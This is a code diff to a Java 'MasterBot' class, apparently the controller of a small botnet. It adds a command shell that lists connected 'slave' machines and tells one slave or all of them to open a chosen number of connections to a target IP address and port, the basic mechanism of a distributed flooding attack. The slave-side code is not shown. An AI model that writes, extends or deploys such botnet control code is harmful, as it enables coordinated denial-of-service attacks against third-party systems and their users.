@@ -7,8 +7,7 @@ public class MasterBot extends Thread
 {
 	//variable declarations
 	private ServerSocket ms;
-	static String slaveIPAddress, targetAddress;
-	static String url = "";
+	static String slaveIPAddress, targetIPAddress;
 	static int noOfSlavesConnected, targetPort, connectionCount;
 	static ArrayList<Socket> clientList = new ArrayList<>();
 	static SlaveBot b = new SlaveBot();
@@ -44,7 +43,7 @@ public class MasterBot extends Thread
 				noOfSlavesConnected++;
 				bw.newLine();
 				
-				data = "Slave " + noOfSlavesConnected + "\t";
+				data = "Slave" + noOfSlavesConnected + "\t";
 				bw.write(data);
 
 				data = "\t" + ss.getRemoteSocketAddress() + "\t";
@@ -106,41 +105,169 @@ public class MasterBot extends Thread
 				e.printStackTrace();
 			}
 		}
-
+		//command line implementation 
 		while (true) 
 		{
 			try 
 			{
 				System.out.print("> ");
 				commandLine = br1.readLine();
-
 				// loop if no data is entered
 				if (commandLine.equals("")) 
 				{
 					continue;
 				}
-
-				// list function logic
-				if (commandLine.endsWith("list")) 
+				// display ArrayList of Clients
+				else if (commandLine.equalsIgnoreCase("clientList")) 
 				{
-					@SuppressWarnings("resource")
+					System.out.println(clientList);
+					continue;
+				}
+				// list function logic
+				else if (commandLine.equals("list")) 
+				{
 					BufferedReader br2 = new BufferedReader(new FileReader("clientLog.txt"));
 					String currentLine;
-					while ((currentLine = br2.readLine()) != null) {
+					while ((currentLine = br2.readLine()) != null) 
+					{
 						System.out.println(currentLine);
 					}
 					System.out.println("Total number of connected slaves : " + noOfSlavesConnected);
+					continue;
 				}
-				// list function logic
+				// connect function logic
+				else if (commandLine.startsWith("connect")) 
+				{
+					//if no slaves are connected
+					if(noOfSlavesConnected == 0)
+					{
+						System.out.println("No Slaves are currently connected to the server.");
+						continue;
+					}
+					
+					String[] dataArray = commandLine.split("\\s+");
+					//if number of connections is not defined
+					if(dataArray.length == 4)
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = 1;
+					}
+					//if number of connections is defined
+					else if(dataArray.length == 5)
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = Integer.parseInt(dataArray[4]);
+					}
+					//for all slaves
+					if (slaveIPAddress.equalsIgnoreCase("all"))
+					{
+						for(int i=0; i<clientList.size(); i++)
+						{
+							for(int j=0; j<connectionCount; j++)
+							{
+								b.connect(clientList.get(i), targetIPAddress, targetPort);
+							}
+						}
+					}
+					//for specific slave
+					else
+					{
+						String line;
+						for(int i=0; i<clientList.size(); i++)
+						{
+							line = "/"+slaveIPAddress;
 
+							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
+							{
+								for(int j=0; j<connectionCount; j++)
+								{
+									b.connect(clientList.get(i), targetIPAddress, targetPort);
+								}
+							}
+						}
+					}
+					continue;
+				}
+				//disconnect function logic
+				else if (commandLine.startsWith("disconnect"))
+				{
+					//if no slaves are connected
+					if(noOfSlavesConnected == 0)
+					{
+						System.out.println("No Slaves are currently connected to the server.");
+						continue;
+					}
+					
+					String[] dataArray = commandLine.split("\\s+");
+					//if number of connections is not defined
+					if(dataArray.length == 4)
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = 1;
+					}
+					//if number of connections is defined
+					else if(dataArray.length == 5)
+					{
+						slaveIPAddress = dataArray[1];
+						targetIPAddress = dataArray[2];
+						targetPort = Integer.parseInt(dataArray[3]);
+						connectionCount = Integer.parseInt(dataArray[4]);
+					}
+					//for all slaves
+					if (slaveIPAddress.equalsIgnoreCase("all"))
+					{
+						for(int i=0; i<clientList.size(); i++)
+						{
+							for(int j=0; j<connectionCount; j++)
+							{
+								b.disconnect(clientList.get(i), targetIPAddress, targetPort);
+							}
+						}
+					}
+					//for specific slave
+					else
+					{
+						String line;
+						for(int i=0; i<clientList.size(); i++)
+						{
+							line = "/"+slaveIPAddress;
+
+							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
+							{
+								for(int j=0; j<connectionCount; j++)
+								{
+									b.disconnect(clientList.get(i), targetIPAddress, targetPort);
+								}
+							}
+						}
+					}
+					continue;
+				}
+				// exit function logic
+				else if (commandLine.equalsIgnoreCase("exit") || commandLine.equalsIgnoreCase("quit") || commandLine.equalsIgnoreCase("-1")) 
+				{
+					System.out.println("Shell Terminated.");
+					System.exit(0);
+				}
+				else
+				{
+					System.out.println("Available Commands are : list, connect, disconnect and exit");
+					continue;
+				}
+				
 			} catch (IOException e) 
 			{
 				e.printStackTrace();
 			}
 		}
-
 	}
 	// main
 	//-----------------------------------------------------------------------------------------------------------------------------------------------
-
 }
+		
